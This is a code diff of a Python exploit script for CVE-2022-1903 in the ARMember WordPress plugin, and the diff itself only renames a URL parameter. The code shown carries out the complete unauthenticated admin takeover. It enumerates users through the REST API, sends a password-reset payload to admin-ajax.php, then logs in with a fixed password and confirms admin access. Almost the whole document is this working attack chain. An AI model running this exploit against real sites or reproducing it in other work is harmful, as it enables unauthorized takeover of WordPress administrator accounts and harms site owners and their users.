@@ -16,7 +16,7 @@ headers = {
 cookies = {'wordpress_test_cookie': 'WP+Cookie+check'}
 
 
-def exploit_armember(target_url, timeout=5):
+def exploit_armember(profile_url, timeout=5):
     """
     Exploit function for ARMember plugin vulnerability (CVE-2022-1903).
     Attempts to exploit an unauthenticated admin account takeover in WordPress.
@@ -24,8 +24,8 @@ def exploit_armember(target_url, timeout=5):
     session = requests.Session()
 
     try:
-        print(colored(f'[•] Fetching user information from: {target_url}wp-json/wp/v2/users/', 'yellow'))
-        response = session.get(url=target_url + 'wp-json/wp/v2/users/', headers=headers, allow_redirects=True, verify=False, timeout=timeout)
+        print(colored(f'[•] Fetching user information from: {profile_url}wp-json/wp/v2/users/', 'yellow'))
+        response = session.get(url=profile_url + 'wp-json/wp/v2/users/', headers=headers, allow_redirects=True, verify=False, timeout=timeout)
         user_data = json.loads(response.text)
         user_slug = user_data[0]['slug']
         print(colored(f'[•] User found: {user_slug}', 'green'))
@@ -40,7 +40,7 @@ def exploit_armember(target_url, timeout=5):
             'login2': user_slug
         }
         print(colored(f'[•] Attempting password reset for user: {user_slug}', 'yellow'))
-        exploit_response = session.post(url=target_url + 'wp-admin/admin-ajax.php', headers=headers, data=payload, allow_redirects=True, verify=False, timeout=timeout)
+        exploit_response = session.post(url=profile_url + 'wp-admin/admin-ajax.php', headers=headers, data=payload, allow_redirects=True, verify=False, timeout=timeout)
 
         if exploit_response.status_code == 200:
             print(colored(f'[•] Password reset payload delivered successfully!', 'green'))
@@ -49,10 +49,10 @@ def exploit_armember(target_url, timeout=5):
                 'log': user_slug,
                 'pwd': 'biulove0x',
                 'wp-submit': 'Login',
-                'redirect_to': target_url + 'wp-admin/',
+                'redirect_to': profile_url + 'wp-admin/',
                 'testcookie': 1
             }
-            login_response = session.post(url=target_url + 'wp-login.php', data=login_data, cookies=cookies, allow_redirects=True, verify=False)
+            login_response = session.post(url=profile_url + 'wp-login.php', data=login_data, cookies=cookies, allow_redirects=True, verify=False)
 
             if 'wp-admin/profile.php' in login_response.text:
                 print(colored(f'[+] Exploit successful! Logged in as {user_slug}', 'green', attrs=['bold']))
